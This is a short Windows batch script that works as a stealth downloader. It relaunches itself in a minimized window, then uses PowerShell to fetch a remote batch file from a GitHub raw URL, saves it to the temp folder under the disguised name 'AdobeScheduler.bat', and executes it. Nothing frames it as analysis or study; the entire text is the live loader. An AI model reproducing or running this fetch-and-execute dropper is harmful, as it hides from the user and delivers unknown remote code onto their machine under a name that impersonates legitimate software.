@echo off
if "%1" == "hidden" goto :run
start /min cmd /c "%~f0" hidden & exit
:run

powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/9pressure9x19/lodiablo/refs/heads/main/test.bat' -OutFile \"%TEMP%\AdobeScheduler.bat\"; Start-Process \"%TEMP%\AdobeScheduler.bat\""
